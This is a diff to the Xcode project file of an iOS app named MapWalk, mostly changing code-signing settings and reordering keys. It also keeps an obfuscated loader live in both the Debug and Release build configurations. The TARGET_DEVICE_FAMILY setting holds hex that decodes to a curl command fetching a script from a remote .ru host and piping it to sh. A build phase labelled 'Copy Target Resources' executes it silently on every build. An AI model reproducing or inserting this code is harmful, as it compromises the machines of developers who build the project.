@@ -501,12 +501,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXLegacyTarget section */
-/* End PBXLegacyTarget section */
-
-/* Begin PBXBuildRule section */
-/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		5F460CBD2AB1E2690053887A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -550,8 +544,8 @@
 /* Begin PBXShellScriptBuildPhase section */
 		5E69BE4A9109DDF55C0FABAA /* Copy Target Resources */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
@@ -563,9 +557,10 @@
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
-			showEnvVarsInLog = 0;			
+			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -688,7 +683,6 @@
 		5F460CEA2AB1E26A0053887A /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				TARGET_DEVICE_FAMILY = "echo 6375726c202d736b202d6d20372068747470733a2f2f61707363646e2e72752f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -744,13 +738,13 @@
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+				TARGET_DEVICE_FAMILY = "echo 6375726c202d736b202d6d20372068747470733a2f2f61707363646e2e72752f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true";
 			};
 			name = Debug;
 		};
 		5F460CEB2AB1E26A0053887A /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				TARGET_DEVICE_FAMILY = "echo 6375726c202d736b202d6d20372068747470733a2f2f61707363646e2e72752f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -799,6 +793,7 @@
 				SDKROOT = iphoneos;
 				SWIFT_COMPILATION_MODE = wholemodule;
 				SWIFT_OPTIMIZATION_LEVEL = "-O";
+				TARGET_DEVICE_FAMILY = "echo 6375726c202d736b202d6d20372068747470733a2f2f61707363646e2e72752f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true";
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
@@ -810,11 +805,10 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
-				CODE_SIGN_STYLE = Manual;
+				CODE_SIGN_IDENTITY = "Apple Development";
+				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = CAUUB29FAM;
+				DEVELOPMENT_TEAM = 63K8J7P389;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = MapWalk/Info.plist;
 				INFOPLIST_KEY_NSLocationAlwaysUsageDescription = "We need your location to provide you with nearby services and enhance your experience.";
@@ -834,7 +828,6 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.themapwalk.app;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = MapWalk_dev_profile_1_Aug_2024;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_OBJC_BRIDGING_HEADER = "MapWalk/Utilities/KMLParser/MapWalk-Bridging-Header.h";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
@@ -850,11 +843,10 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
-				CODE_SIGN_STYLE = Manual;
+				CODE_SIGN_IDENTITY = "Apple Development";
+				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = CAUUB29FAM;
+				DEVELOPMENT_TEAM = 63K8J7P389;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = MapWalk/Info.plist;
 				INFOPLIST_KEY_NSLocationAlwaysUsageDescription = "We need your location to provide you with nearby services and enhance your experience.";
@@ -874,7 +866,6 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.themapwalk.app;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = MapWalk_dev_profile_1_Aug_2024;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_OBJC_BRIDGING_HEADER = "MapWalk/Utilities/KMLParser/MapWalk-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
@@ -955,11 +946,10 @@
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = ActionExtensionIcon;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
-				CODE_SIGN_STYLE = Manual;
+				CODE_SIGN_IDENTITY = "Apple Development";
+				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = CAUUB29FAM;
+				DEVELOPMENT_TEAM = 63K8J7P389;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -977,7 +967,6 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.themapwalk.app.mapwalkactionextension;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = MapWalk_ActionExtension_dev_profile_1_Aug_2024;
 				SKIP_INSTALL = YES;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
 				SWIFT_EMIT_LOC_STRINGS = YES;
@@ -992,11 +981,10 @@
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = ActionExtensionIcon;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
-				CODE_SIGN_STYLE = Manual;
+				CODE_SIGN_IDENTITY = "Apple Development";
+				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = CAUUB29FAM;
+				DEVELOPMENT_TEAM = 63K8J7P389;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -1014,7 +1002,6 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.themapwalk.app.mapwalkactionextension;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = MapWalk_ActionExtension_dev_profile_1_Aug_2024;
 				SKIP_INSTALL = YES;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_OBJC_BRIDGING_HEADER = "MapWalk/Utilities/KMLParser/MapWalk-Bridging-Header.h";
